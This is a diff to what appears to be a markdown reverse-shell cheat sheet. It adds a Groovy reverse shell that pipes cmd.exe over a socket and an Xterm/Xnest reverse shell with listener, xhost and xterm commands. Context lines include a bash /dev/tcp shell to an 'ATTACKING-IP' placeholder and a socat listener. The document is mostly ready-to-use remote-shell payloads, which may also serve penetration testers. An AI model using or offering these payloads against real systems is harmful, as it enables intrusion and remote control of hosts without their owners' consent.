@@ -172,6 +172,17 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 ```
 
+### Groovy
+
+```
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+This was sourced from a gist user [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).
+
 ### Python
 
 ```py
@@ -189,6 +200,31 @@ These shells can't be captured with netcat however, you'll have to use socat
 ```bash
 socat file:`tty`,echo=0,raw udp-listen:1234
 ```
+
+### Xterm
+
+For this you'll need xnest installed and a remote xterm client available.  You can set up the listener on your own listener server using one of the following two commands:
+
+```
+Xnest :3 -ac -once -query localhost
+Xnest :3 -listen tcp
+```
+
+This opens a listener on port 6003, but you can choose any alternative to `:3`
+
+The access control list on your server also needs to be amended to allow access from your machine.
+
+```
+xhost +<remote ip>
+```
+
+On the remote machine you can then run:
+
+```
+xterm -display <server ip>:3
+```
+
+From this you'll receive a reverse shell.
 
 ## Web-shells - Platform Independent
 
